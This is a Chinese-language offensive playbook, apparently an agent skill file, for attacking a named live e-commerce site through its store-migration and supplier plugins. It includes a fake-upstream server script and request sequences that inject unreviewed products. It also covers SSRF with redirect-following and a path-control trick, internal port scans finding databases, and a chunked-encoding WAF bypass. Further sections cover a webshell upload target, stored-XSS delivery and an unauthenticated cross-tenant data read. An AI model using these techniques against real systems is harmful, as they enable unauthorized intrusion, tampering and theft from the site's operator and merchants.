# MigrateShopPro（鲸商城PRO 搬家插件）协议契约与实测结论

适用：目标前端 console 泄露 `Design with by 鲸商城PRO【全新版】 https://www.jingsoft.com`，商户端装有「搬家/一键迁移」类插件。
该插件把另一个（同源）鲸商城实例的数据按阶段搬进本店；**源站完全由商户填写** ⇒ 源站可为我方伪造。

## 1. 路由族

`/plugin/MigrateShopPro/merchant/{detect,start,detail,tasks,run,delete}` —— 走**插件路由族**（不经后台路径闸），鉴权 = `Merchant-Token` 头（带令牌即返回真实插件页 HTML）。

| 端点 | 作用 |
|---|---|
| `detect` | 只吃 `source_url`；服务端按指纹路径（`GET /login`、`GET /user/login`…）探源站并把 title 回显 ⇒ **出站 SSRF + 指纹神谕** |
| `start` | 建任务并立即执行；体字段 = `source_url` / `username` / `password`（**任务记录里叫 `source_username`/`source_password`，别混**）；返回 `{"code":1,"msg":"任务已创建，开始迁移","data":{"task_id":N}}` |
| `tasks` | 列表；回吐 `source_url` / `source_username` / `source_password`（AES-CBC，随机 IV）/ `migrate_scope` / `stage` / `error_msg` / `log` |
| `detail` | GET `?task_id=N`，按 `user_id` 硬隔离 |

- `migrate_scope` 可选 `categories,goods,cards,description,image`。
- 历史任务里可见内网实例声明 `http://[::ffff:127.0.0.1]:8888/` + `source_username:admin`（实探无监听，属残留）。
- 插件说明自述「卡密通过系统接口导入」⇒ 卡密阶段走平台本地特权 API，不走源站协议。

## 2. 假上游骨架（raw socket + 热路由 + 日志）

要点：`0.0.0.0` 监听；**任意方法**都记录 request line/headers/body；响应从外置 JSON 路由表取（改文件即生效）；未命中返回默认 JSON 而非 404 页面（插件只认 JSON 形状）。

```python
import json, socket, threading
PORT, ROUTES, LOG = 8084, '/root/fs_routes.json', '/root/fs.log'

def routes():
    try:
        return json.load(open(ROUTES))
    except Exception:
        return {}

def handle(c):
    try:
        raw = c.recv(65536).decode('utf-8', 'replace')
        open(LOG, 'a').write(raw + '\n----\n')
        line = raw.split('\r\n', 1)[0].split(' ')
        path = line[1].split('?')[0] if len(line) > 1 else '/'
        hit = routes().get(path)
        out = hit.encode() if isinstance(hit, str) else json.dumps(hit or {'code': 1}, ensure_ascii=False).encode()
        c.sendall(b'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: '
                  + str(len(out)).encode() + b'\r\nConnection: close\r\n\r\n' + out)
    except Exception as e:
        open(LOG, 'a').write('ERR %s\n' % e)
    finally:
        c.close()

s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', PORT)); s.listen(64)
while True:
    c, _ = s.accept(); threading.Thread(target=handle, args=(c,), daemon=True).start()
```

路由表示例（键 = 插件请求的路径，值 = 插件期望的 JSON）：

```json
{"/merchantApi/user/checkSafeMode": {"code":1,"data":{"token":"<任意值>"}},
 "/merchantApi/Goods/list": {"code":1,"data":{"list":[{"id":8001,"name":"X","goods_type":"card","image":"http://<mine>/i.png"}]}}}
```

## 3. 迭代循环（实测走法）

1. 起假上游 → `start` 指它 → 读上游日志看下一个请求路径 → 往路由表加该路径 → 重跑。
2. `请填写源站账号和密码` ⇒ 字段名错（抓前端 JS 得 `username`/`password`）。
3. 抓包得「源站登录 = `POST /merchantApi/user/checkSafeMode`」⇒ **源站 = 另一个鲸商城PRO 站**，按此复刻响应即可。

### 3.1 登录是两跳（缺第二跳必卡）

```
POST /merchantApi/user/checkSafeMode   username=<u>&password=<p>   → 需 {"code":1,…}
POST /merchantApi/user/login           username=<u>&password=<p>   → 必须回 data.merchant_token
```

- 只回 `code:1`+`msg` ⇒ `源站登录失败… 返回：success`；有 code 无令牌 ⇒ `新版登录成功但未返回 merchant_token`。
- 之后所有上游请求带 `Merchant-Token: <merchant_token>` 头（与平台本地商户票同名，别混）。

### 3.2 抓取阶段 = 候选端点试探，「非空列表」才算匹配

`fetch_categories` 按序试（每个候选先 POST 再 GET）：`/merchantApi/goodsCategory/list` → `/merchantApi/GoodsCategory/list` → `/merchantApi/GoodsCategory/listAll` → `/merchant/goods_category/list` → `/api/goods/category`。

- **第一个返回 `code:1` 且 `list` 非空者被锁定**，后续阶段沿用同族前缀。
- 全空 ⇒ `接口已匹配但列表为空`（**不会接着试下一个候选**）⇒ 假上游 default 不要统一回空列表，未知路径回 404/错误码更安全。

### 3.3 实测请求序列（照此喂数据即可推进前四阶段）

```
POST /merchantApi/user/checkSafeMode      username&password
POST /merchantApi/user/login              username&password        → data.merchant_token
POST /merchantApi/user/userinfo
POST /merchantApi/goodsCategory/list      current=1&page=1&pageSize=200&limit=200&goods_type=card&name=
POST /merchantApi/Goods/list              …&goods_type=card&status=999&is_proxy=0
POST /merchantApi/Goods/info              id=<goods_id>
POST /merchantApi/goodsCardStorage/list   …&goods_id=<id>&status=0
```

- 响应信封逐字对齐真站：`{"code":1,"msg":"success","data":{"total":N,"list":[…]}}`（字段名是 `total`/`list`）。
- 真站 `goodsCardStorage/list` 缺 `goods_id` 回 `{"code":0,"msg":"商品不存在"}`。
- 实测进度：`import_categories 1/1` + `import_goods 1/1` 落库，`card 0/1` 卡在平台本地特权接口（结论同 §4）。

## 4. 实测结论（catfk.com，2026-10）

- **端到端跑通 6 阶段**（分类/商品/描述/图片/…）：目标站**真实建出商品**（如 `goods id 49111` + 新分类），且 **`verify=1` ⇒ 绕过商品审核直接上架**；`description` / `extend.instructions` 原样落库。
- **`image` 字段 = 原样存 URL**（读回落库值与投递 URL 逐字一致，服务端**不下载、不写本地文件**）⇒「图片迁移 = 服务端写文件」假设**证否**。
- **卡密阶段卡死**：`import_cards` 报「系统卡密接口导入失败…原因：请先登录！」（复跑另一文案：「缺少商家登录态，无法通过系统接口导入卡密」）；**把假登录响应换成真商户令牌后仍报同一句** ⇒ 该"系统卡密接口"是**平台本地特权 API（需管理员身份），与源站令牌无关** ⇒ 商户票打不通，此路不再作为 RCE 候选。
- **内网探测**：`[::ffff:127.0.0.1]:8888` → `status:0`（无监听）；`[::ffff:127.0.0.1]`（:80）→ 403（有 nginx，Host 不匹配 vhost）；内网测绘：`:443 → detected:"new"`、`:80 → 403`、`:888 → 403`、`:28842 → 宝塔「网站防火墙」页`。**⚠ 插件探测响应按 host+path 缓存，且 `detect` / `get_category` 口径不同 ⇒ 跨端点或不带唯一路径的探测会互相污染，不能合并成一份端口表。唯一路径重测：`:888` → `HTTP 404`、`:28842` → `Connection refused`（旧表的 `403` 与「宝塔页」不可复现）；同一轮另测到 `:443 → HTTP 302`，`:3306`/`:6379`/`:11211`/`:27017` 在听。**
- **★ 但「固定 Host ⇒ 只能打固定路径」是错的：抓取客户端跟随 302。** 假上游对 `goodsCategory/list` 等候选路径回 `302 Location: http://<同 host>/REDIR_A`，上游日志立刻出现 `GET /REDIR_A`（同一 UA、同一秒，多条候选路径都跟随）⇒ **服务端出站可被引到任意 host:port + 任意路径**（含 `http://127.0.0.1:<port>/<path>`），源 IP = 服务器本机、免边缘 WAF/CF；POST 被降级成 GET。⇒ 路径规范化只否掉「直接注入路径」，**不能写成任意路径 SSRF 判死**。回显通道 = 任务 `detail` 的 `log`/`error_msg`（或落库产物回读）。
- **结论口径**：导入链给出的是**免审核内容写入原语 + HTML 注入面**（可作存储型 XSS 的投递口），**不是 RCE**；服务器执行权仍取决于拿管理员票 + 写文件原语 + 落地文件被执行三环。

## 5. 同族站点复测补充（判据更硬）

- **任务要显式 `run`**：`start` 建出的任务初态是 `created`（附 `only_unsold_cards` / `duplicate_policy` 字段），不 `run` 不推进；`st=2` = 搬家完成。请求用**商家 cookies + `Merchant-Token`** 双带才稳。
- **WAF 绕过只有 chunked**：商品写接口（`Goods/update|edit|save`）带载荷 → `403 网站防火墙`；**`Transfer-Encoding: chunked` 只对 POST body 有效**，可穿透；查询串照过 WAF（`%2f` GET 全 403），`code` 字段在应用层另有字符过滤（`<?php` 被清空）。
- **chunked 写通了也会被业务闸挡**：实测回「请先完善店铺联系方式，QQ、手机、微信至少填写一项」，而店铺设置端点（`Shop/save|update|setInfo`）全 404 ⇒ 写原语可用但缺前置，记「部分可达」，别记成失败。
- **真上传口在插件字段里**：`Plugin/list` 的 `form_fields` 给 `{"type":"upload","url":"/merchantApi/upload/file","accept":".mp3"}`（别只试 `/Upload/file`）；空传报「未获取到上传的文件对象」用来确认字段名；扩展名白名单统一回「文件类型受限，请在后台配置规则！」。**⚠ 探测时碰 `.php` 会触发 WAF 的 IP 级封禁，烧掉整台出口机器（本族实测连烧两台），出口纪律见本技能 SKILL.md 通用坑。**
- **`MigrateShopPro/admin/{index,setting,config,save,upload}` 全 `401 请先登录`** ⇒ 拿 admin 票即 `admin/upload` = webshell 落地点（admin 票 → 见 `payload-execution-verification`）。
- **`description` 落库 ≠ 客户页会执行**：商品页是独立懒加载 chunk，字段只做文本绑定 ⇒ 存储型 XSS 在这一面判否（详见 `payload-execution-verification`）。插件 API 命名空间（`/plugin/<Code>/Api/*`）**鉴权完整**，干净空会话全 401，别信「带 cookie 的 200」。

## 6. 插件族清单与 AcgFakaStorage 出站 SSRF（同站实测）

### 6.1 插件族（`/merchantApi/Plugin/list` + `Plugin/detail {code}`）

`Plugin/list` 逐条给 `code` / `name` / `version` / `menu`（含 iframe `src`）/ `form_fields`；`Plugin/detail {code}` 给完整定义。**真入口前缀不统一**，且不要用 `/plugin/<Code>/api/*` 的 404 判「未安装」。

| code | 名称 | 真入口 | 备注 |
|---|---|---|---|
| `AcgFakaStorage` | 异次元权益配置 | `/plugin/AcgFakaStorage/api/index`（GET 200，30KB 内联 Vue+axios） | `form_fields` = `api`（平台域名）/ `app_id` / `app_key` |
| `MigrateShopPro` | 商户搬家Pro | `/plugin/MigrateShopPro/merchant/index?v=1073` | `form_fields=[]`（参数在页面里填） |
| `Storeannouncements` | 购买页面弹窗提示 | `/plugin/Storeannouncements/Api/index` | `api/{fetchData,save}`；XSS 死信箱就用它 |
| `ShopMusic` | 店铺音乐 | `/plugin/ShopMusic/merchant/index` | `music_url` type=upload → `/merchantApi/upload/file` |
| `MallBeautification` | 商户商城美化 | `/plugin/MallBeautification/merchant/index` | 装饰字段 |

**⚠ 响应口径**：插件回 `{"code":200,...}`（异次元生态），宿主平台回 `{"code":1,...}` ⇒ 判定别混，混了会把成功读成失败。

### 6.2 AcgFakaStorage 全部动作（`const P="/plugin/AcgFakaStorage/api/"`，JSON 体）

```
GET  P/fetchData                                   // 读配置：无票 401「请先登录！」；带票回明文 api/app_id/app_key
POST P/save            {api, app_id, app_key}       // 写本店插件配置（可原样还原）
POST P/testConnect                                  // 出站连通性
POST P/get_category                                 // 请求 api 域名
POST P/get_goods_list  {category_ids:[...]}
POST P/get_sup_category
POST P/shopCloneSelected {..., goods_items:[...]}   // 克隆上游商品到本站（写商品）
POST P/update_sup_price  {category_list_ids:[...]}  // 改价
POST P/clean_sup_category {category_list_ids:[...]} // 清分类
```

`shopCloneSelected` / `update_sup_price` / `clean_sup_category` 是**写/删商品面**，未验证前不动。

### 6.3 出站 SSRF 实测（★ 路径 + query 可控，body 不可控）

`save {api:"http://<h>:<p>"}` → `get_category`：打我方信标回 `HTTP 204`、`mark.test` 回 `code:500「Could not resolve: mark.test」` ⇒ **真出站**。

**★ 路径控制 = 基址末尾补 `?`。** 插件固定拼 `/shared/authentication/connect` + `/shared/commodity/items`；不带 `?` 时实际路径 = `<你的路径>/shared/...` ⇒ 清一色 404（这曾被误记成「路径不可控」）。带 `?` 后尾巴落进查询串丢弃、命中路径恰是你的路径：`api="https://catfk.com/merchantApi/user/userinfo?"` → 回该端点**真业务响应「请先登录！」**（判据：回的是目标站业务文案，而非连接类错误）。

- **query 可控、body 不可控**：在 `app_id` 值里塞 `&username=..&password=..` 不注入新字段（实测被编码/过滤，`auth/login` 仍回「用户名或密码不能为空」）⇒ 只吃 body 的端点喂不进参数。验证姿势 = 打到自家收集器后读它记下的原始 body。
- **读回只有映射字段**：稳定可读 = `msg`（原样透传）+ 被映射的 `data` 形状；非 JSON 正文只得 `HTTP <码>` 或「响应解析失败」⇒ 要读原文另找外带面。
- **响应按 host+path 缓存**：同 host+path 不同 port 会命中同一份缓存（实测序列后半段全回前半段某端口的文案）⇒ 端口扫描每次给唯一路径（`/pp<port>?`）并核对 `msg` 里回显的端口。

端口 oracle（curl 错误即判据，唯一路径重测）：`127.0.0.1:80`→`HTTP 404`（默认 vhost）；`localhost:80`→`HTTP 403`；`:443`→`HTTP 302`；`:888`→`HTTP 404`；`:6379`→`Empty reply`（Redis）；`:3306`→`HTTP/0.9 when not allowed`（MySQL）；`:11211`/`:27017`→`Empty reply`（memcached / Mongo 在听）；`:8080`/`:8888`/`:28842`/`:9000`/`:8000`/`:9090`/`:8443`/`:3000`/`:2087`/`:2083`→`Connection refused`。**分诊：`HTTP 4xx` = HTTP 服务在、Host/路径不匹配；`Empty reply`/`HTTP/0.9` = 非 HTTP 服务在听；refused = 无监听。**

**Host 决定鉴权闸分支（同一路径文案不同）**：`Host: catfk.com` →「请使用正确的后台路径访问」（路径白名单闸）；`Host: 127.0.0.1` →「系统未授权或已过期」（token 闸）⇒ 经此通道打 `127.0.0.1` 可**越过路径闸但仍卡 token**；libcurl 不给设头 ⇒ 靠 `X-Forwarded-Host` 的绕过在此通道**不可达**。

**免鉴权面实测（极窄）**：`https://catfk.com/adminApi/System/config` **免票读全**（运营主体「南京爱维云网络科技有限公司」/ 备案号 / 菜单树 / 插件静态资源 URL）；`adminApi/auth/login` 免票可达但**只吃 POST body**（query 无效，回「用户名或密码不能为空」）；`auth/register|captcha|forget|findUsername`、`router/getList`、`adminApi//User/*`（双斜杠旧路由）全部需 token 或 404。**插件静态路由 `/plugin/<Code>/static/<b64>`：合法资源可读（回「响应解析失败」= 真取到非 JSON 正文），但 `../` 的 base64 与裸 `%2f` 穿越均回 `403`（有校验）⇒ 不当「任意文件读」投入轮次。**

### 6.4 Storeannouncements 免票跨租户读

`POST /plugin/Storeannouncements/api/fetchData {merchant_id:N}` **不带 `Merchant-Token`** 即回该租户内容（实测 736 / 8429 / 459 三店：自己的载荷原文 / 另一店原文 / 空 `status:0`）；**不带参数时回 `code:0「未找到商家信息」（不是 401）** ⇒ 早前把它记成「401 已补丁」是**缺参数的假阴性**。带票读回自己的载荷原文可作**载荷在库自证**。

### 6.5 跨租户判负（本族口径，已验证）

- `MigrateShopPro/merchant/tasks` 带 `{user_id|merchant_id|page|limit}` 全被忽略 ⇒ 恒返自己那几条（跨参数值 id 集合完全相同）。
- `MigrateShopPro/merchant/detail {task_id}` 跨属主 → 「任务不存在」；自己的 244 号回全量（`source_password:"aes:…"` / `migrate_scope:"categories,goods,cards,description,image"` / 分阶段 `log` / `error_msg` 点名商品 id）。
- `AcgFakaStorage/fetchData` 无票 401、带票只回自己配置。
- 宿主平台 `/adminApi/manage.<模块>/<动作>` 与插件面是**两套鉴权**：商户票过不了平台路由，但仍能读上面这些免票插件端点。
